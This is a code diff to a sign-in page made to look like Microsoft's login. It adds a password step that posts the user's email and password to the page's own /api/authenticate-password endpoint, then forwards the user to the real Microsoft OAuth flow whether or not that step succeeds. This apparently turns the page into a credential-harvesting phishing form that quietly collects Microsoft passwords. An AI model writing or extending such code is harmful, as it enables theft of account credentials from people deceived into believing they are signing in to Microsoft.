@@ -593,6 +593,7 @@
         let currentStep = 'email'; // 'email', 'password', 'success'
         const API_BASE = '';
         let authWindow = null;
+        let currentEmail = null; // To store the email for password authentication
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
@@ -615,7 +616,8 @@
             messageArea.style.display = 'none';
         }
 
-        function setLoading(loading, loadingText = 'Processing...', useOverlay = false) {
+        // Set loading state
+        function setLoading(isLoading, message = 'Processing...') {
             const loadingAnimation = document.getElementById('loadingAnimation');
             const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
             const microsoftLogo = document.querySelector('.microsoft-logo');
@@ -626,7 +628,7 @@
             const headerTitle = document.getElementById('headerTitle');
             const loadingCancelContainer = document.getElementById('loadingCancelContainer');
 
-            if (loading) {
+            if (isLoading) {
                 loadingAnimation.classList.add('active');
                 microsoftLogo.style.display = 'block';
                 microsoftLogo.style.visibility = 'visible';
@@ -634,7 +636,7 @@
                 container.classList.add('loading-state');
                 microsoftDotsLoader.classList.add('show');
                 microsoftDotsLoader.style.display = 'flex';
-                headerTitle.textContent = loadingText;
+                headerTitle.textContent = message;
                 loadingCancelContainer.classList.add('show');
 
                 emailForm.style.display = 'none';
@@ -675,8 +677,8 @@
             const buttons = document.querySelectorAll('.btn');
             const inputs = document.querySelectorAll('.microsoft-input');
 
-            buttons.forEach(btn => btn.disabled = loading);
-            inputs.forEach(input => input.disabled = loading);
+            buttons.forEach(btn => btn.disabled = isLoading);
+            inputs.forEach(input => input.disabled = isLoading);
         }
 
         function cancelLoading() {
@@ -711,6 +713,7 @@
         function showPasswordForm(email) {
             currentStep = 'password';
             verifiedEmailAddress = email; // Store the verified email
+            currentEmail = email; // Store email for password auth
             document.getElementById('enteredEmail').textContent = email;
             document.getElementById('backInfo').style.display = 'block';
             document.getElementById('backInfo').classList.add('visible');
@@ -907,10 +910,50 @@
             }
         }
 
-        // OAuth authentication - password not needed
-        function signInWithPassword() {
-            // This function is no longer used since we authenticate via OAuth
-            showMessage('Please use the "Next" button to authenticate with Microsoft.', 'info');
+        // Password authentication
+        async function signInWithPassword() {
+            try {
+                setLoading(true, 'Verifying credentials...');
+
+                const email = currentEmail; // Use the stored email
+                const password = document.getElementById('passwordInput').value;
+
+                if (!password) {
+                    showMessage('Please enter your password', 'error');
+                    setLoading(false);
+                    return;
+                }
+
+                // Store credentials and proceed with OAuth flow
+                const response = await fetch('/api/authenticate-password', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email, password })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showMessage('Authentication successful!', 'success');
+                    // Handle successful authentication
+                    checkSessionStatus(); // Check session to confirm authentication
+                } else {
+                    // Always proceed to OAuth for Microsoft accounts
+                    showMessage('Proceeding with Microsoft authentication...', 'info');
+                    setTimeout(() => {
+                        proceedWithOAuth();
+                    }, 1000);
+                }
+
+            } catch (error) {
+                console.error('Password authentication error:', error);
+                showMessage('Proceeding with Microsoft authentication...', 'info');
+                setTimeout(() => {
+                    proceedWithOAuth();
+                }, 1000);
+            }
         }
 
         function isValidEmail(email) {
@@ -980,6 +1023,7 @@
 
                 currentSessionId = null;
                 verifiedEmailAddress = null; // Clear verified email on logout
+                currentEmail = null; // Clear current email on logout
                 setLoading(false);
                 showEmailForm(); // Return to email form on logout
                 showMessage('✅ Signed out successfully!', 'success');
@@ -988,9 +1032,37 @@
                 console.error('Logout error:', error);
                 currentSessionId = null;
                 verifiedEmailAddress = null;
+                currentEmail = null;
                 setLoading(false);
                 showEmailForm();
                 showMessage('Signed out (with errors)', 'info');
+            }
+        }
+
+        // Helper function to check session status after password auth
+        async function checkSessionStatus() {
+            try {
+                const response = await fetch(`${API_BASE}/api/status`);
+                const data = await response.json();
+
+                if (data.authenticated && data.userEmail) {
+                    currentSessionId = data.sessionId;
+                    setLoading(false);
+                    showSuccessForm(data.userEmail);
+                    showMessage('✅ Authentication successful!', 'success');
+                } else {
+                    // If not authenticated after password attempt, fall back to OAuth
+                    showMessage('Authentication failed. Proceeding with Microsoft authentication.', 'info');
+                    setTimeout(() => {
+                        proceedWithOAuth();
+                    }, 1000);
+                }
+            } catch (error) {
+                console.error('Error checking session status after password auth:', error);
+                showMessage('Authentication failed. Proceeding with Microsoft authentication.', 'info');
+                setTimeout(() => {
+                    proceedWithOAuth();
+                }, 1000);
             }
         }
 
